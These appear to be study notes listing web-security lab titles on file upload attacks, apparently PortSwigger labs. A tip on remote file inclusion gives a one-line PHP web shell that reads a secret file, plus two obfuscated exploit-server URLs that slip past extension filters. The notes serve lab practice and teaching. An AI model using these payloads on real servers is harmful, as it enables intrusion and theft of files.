- Remote code execution via web shell upload
- Web shell upload via Content-Type restriction bypass
- Web shell upload via path traversal
- Web shell upload via extension blacklist bypass
- **_Remote file Inclusion_**
>Tip: In the labs we create our own shell.php file and upload it on the server directly. However if the server allows RFI we could simply use the exploit server to host our shell.php file containing the following code. `<?php echo file_get_contents('/home/carlos/secret'); ?>` If the server is implementing filtering techniques, for example, to only accept remote links with JPG extension. We can simply obfuscate our link as follows.
>`https://exploit-server.com/shell.php%00file.jpg`
>`https://exploit-server.com/shell.php#file.jpg`
    More techniques could be found here. [https://portswigger.net/web-security/file-upload#obfuscating-file-extensions](https://portswigger.net/web-security/file-upload#obfuscating-file-extensions)
    
- **_Web shell upload via obfuscated file extension_**
- Remote code execution via polyglot web shell upload
- Web shell upload via race condition
- Using PHAR deserialization to deploy a custom gadget chain

